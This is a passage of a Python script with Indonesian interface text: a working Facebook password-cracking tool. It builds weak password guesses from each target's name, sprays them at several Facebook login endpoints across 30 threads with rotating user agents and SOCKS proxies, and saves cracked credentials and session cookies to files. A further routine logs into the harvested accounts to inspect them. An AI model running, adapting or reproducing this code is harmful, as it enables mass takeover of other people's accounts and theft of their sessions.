	cetak(panel(f'   [bold green]𝖬𝖺𝗂𝗇𝗄𝖺𝗇 𝖬𝗈𝖽𝖾 𝖯𝖾𝗌𝖺𝗐𝖺𝗍 𝖲𝖾𝗍𝗂𝖺𝗉 500 𝖨𝖽𝗓 , 𝖴𝗇𝗍𝗎𝗄 𝖬𝖾𝗇𝖼𝖾𝗀𝖺𝗁 𝖲𝖯𝖠𝖬 𝖨𝖯',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]ALERT [bold red]• [yellow]• [bold green]•",subtitle=f"[bold green]• [bold yellow]• [bold red]• [bold white]CRACK IN PROGRES [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	print('')
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(bar_width=23),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
					else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				elif 'mobile-v2' in method:
					pool.submit(crackmobile,idf,pwv)
				else:
					pool.submit(crackmobile,idf,pwv)
		print('')
		cetak(panel(f'[bold green]Succesfully Crack,Dont Forget Send Your Feedback After Use My Script, Thanks You',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SUCCESFULY [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
		print('')
		print(f'{h} OK : {h}%s '%(ok))
		print(f'{k} CP : {k}%s{x} '%(cp))
		print('')
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[white]mobile {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
	prog.advance(des)
	#ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ua ='Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36'
	ua2 ='Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf} | {pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]AGUNG CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf} | {pw}\n[cyan]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]AGUNG OK{tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE-FREE-FB ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
	prog.advance(des)
	ua = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "free.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://free.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Ffree.facebook.com%2Fv2.6%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D211376560532885%26redirect_uri%3Dhttps%253A%252F%252Fauth.japantimes.co.jp%252Fid%252Fapi%252Fv1%252Fidentity%252Flogin%252Fsocial%252Fcallback%26scope%3Demail%26state%3Dk0nJSZrhdsfv%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6c5912f0-126a-4b97-bab0-999383433100%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.japantimes.co.jp%2Fid%2Fapi%2Fv1%2Fidentity%2Flogin%2Fsocial%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dk0nJSZrhdsfv%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/v2.6/dialog/oauth?display=popup&response_type=code&client_id=211376560532885&redirect_uri=https%3A%2F%2Fauth.japantimes.co.jp%2Fid%2Fapi%2Fv1%2Fidentity%2Flogin%2Fsocial%2Fcallback&scope=email&state=k0nJSZrhdsfv&ret=login&fbapp_pres=0&logger_id=6c5912f0-126a-4b97-bab0-999383433100&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host": "free.facebook.com","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://free.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "com.facebook.katana","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": f"https://free.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Ffree.facebook.com%2Fv2.6%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D211376560532885%26redirect_uri%3Dhttps%253A%252F%252Fauth.japantimes.co.jp%252Fid%252Fapi%252Fv1%252Fidentity%252Flogin%252Fsocial%252Fcallback%26scope%3Demail%26state%3Dk0nJSZrhdsfv%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6c5912f0-126a-4b97-bab0-999383433100%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.japantimes.co.jp%2Fid%2Fapi%2Fv1%2Fidentity%2Flogin%2Fsocial%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dk0nJSZrhdsfv%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]RONI CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS CP {tgl} {bln} {thn}")
				#tree.add(f"[bold yellow]{idf}|{pw}")
				#tree.add(f"[bold red]{ua}\n")
				#cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]RONI OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
				#tree.add(f"[bold green]{idf}|{pw}")
				#tree.add(f"[bold green]{kuki}[/]")
				#tree.add(f"[bold blue]{ua}\n")
				#cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MBASIC ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
	prog.advance(des)
	ua = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]RONI CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS CP {tgl} {bln} {thn}")
				#tree.add(f"[bold yellow]{idf}|{pw}")
				#tree.add(f"[bold red]{ua}\n")
				#cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]RONI OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
				#tree.add(f"[bold green]{idf}|{pw}")
				#tree.add(f"[bold green]{kuki}[/]")
				#tree.add(f"[bold blue]{ua}\n")
				#cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE-MOBILE-V2 ]-----------------#
def crackmobile(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "mobile.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://mobile.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D124207444332529%26redirect_uri%3Dhttps%253A%252F%252Fpassport.alibaba.com%252Foauth_sign.htm%253Ftype%253Dfacebook%26display%3Dpopup%26response_type%3Dcode%26scope%3Demail%252Cpublic_profile%252Cuser_work_history%26state%3Didc_7T2c2YaGh4GCfn_XCx0sdbw%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbf813dc3-ce3b-441f-ad55-557755667d9e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpassport.alibaba.com%2Foauth_sign.htm%3Ftype%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Didc_7T2c2YaGh4GCfn_XCx0sdbw%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mobile.facebook.com/v2.9/dialog/oauth?client_id=124207444332529&redirect_uri=https%3A%2F%2Fpassport.alibaba.com%2Foauth_sign.htm%3Ftype%3Dfacebook&display=popup&response_type=code&scope=email%2Cpublic_profile%2Cuser_work_history&state=idc_7T2c2YaGh4GCfn_XCx0sdbw&ret=login&fbapp_pres=0&logger_id=bf813dc3-ce3b-441f-ad55-557755667d9e&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host": "mobile.facebook.com","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://mobile.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": f"https://mobile.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D124207444332529%26redirect_uri%3Dhttps%253A%252F%252Fpassport.alibaba.com%252Foauth_sign.htm%253Ftype%253Dfacebook%26display%3Dpopup%26response_type%3Dcode%26scope%3Demail%252Cpublic_profile%252Cuser_work_history%26state%3Didc_7T2c2YaGh4GCfn_XCx0sdbw%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbf813dc3-ce3b-441f-ad55-557755667d9e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpassport.alibaba.com%2Foauth_sign.htm%3Ftype%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Didc_7T2c2YaGh4GCfn_XCx0sdbw%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://mobile.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]RONI CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS CP {tgl} {bln} {thn}")
				#tree.add(f"[bold yellow]{idf}|{pw}")
				#tree.add(f"[bold red]{ua}\n")
				#cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}[/]",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan] RONI OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
				#tree.add(f"[bold green]{idf}|{pw}")
				#tree.add(f"[bold green]{kuki}[/]")
				#tree.add(f"[bold blue]{ua}\n")
				#cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
### CEK OPSI ###
def ingfo():
	print("┣[*❯  masukan file (ex: CP/%s.txt)"%(tanggal))
	files = input(" [?] nama file  : ")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("┣[!❯ nama file %s tidak tersedia"%(files))
	print("┣[+❯ total akun : \033[0;91m%s\033[0;97m"%(len(buka_baju)))
	print("┣[*❯ sedang prosess cek akun....")
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))
		try:
			check_in(titid[0].replace("  * --> ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	print("┣[!❯ cek akun sudah selesai...")
	input("┣[+❯ pencet enter untuk kembali ke menu ")
	time.sleep(1)
	menu()
	
def check_in(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
	ses = requests.Session()
	#-> pemisah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print("┣[+❯ aplikasi terhubung ada : "+str(len(xe)))
		num = 0
		for _ in xe:
			num += 1
			print("   "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print("┣[+❯ terdapat "+str(len(ngew))+" opsi ")
		for opt in range(len(ngew)):
			print(" ["+str(opt+1)+"] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("┣[!❯ %s"%(oh))
	else:
		print("┣[!❯ login gagal, silahkan cek kembali id dan password")
	
def buat_folder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass   
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0012)
                
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	Code_()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> GITHUB.COM/RENVVV <<<<<#